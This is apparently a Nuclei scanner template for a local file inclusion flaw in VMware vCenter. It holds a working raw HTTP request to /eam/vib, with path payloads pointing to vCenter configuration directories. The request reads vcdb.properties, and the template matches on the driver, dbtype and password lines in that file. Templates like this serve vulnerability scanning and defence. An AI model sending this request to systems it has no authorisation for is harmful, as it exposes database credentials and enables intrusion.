http:
- matchers:
  - regex:
    - (?m)^(driver|dbtype|password(\.encrypted)?)\s=
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  payloads:
    path:
    - C:\ProgramData\VMware\VMware+VirtualCenter
    - C:\Documents+and+Settings\All+Users\Application+Data\VMware\VMware+VirtualCenter
    - C:\ProgramData\VMware\vCenterServer\cfg\vmware-vpx
  raw:
  - 'GET /eam/vib?id={{path}}\vcdb.properties HTTP/1.1

    Host: {{Hostname}}

    '
id: vmware-vcenter-lfi
info:
  author: dwisiswant0
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-22
  description: VMware vCenter is vulnerable to local file inclusion.
  metadata:
    max-request: 3
  name: VMware vCenter - Local File Inclusion
  reference:
  - https://kb.vmware.com/s/article/7960893
  - https://twitter.com/ptswarm/status/1316016337550938122
  severity: high
  tags: vmware,lfi,vcenter,vuln
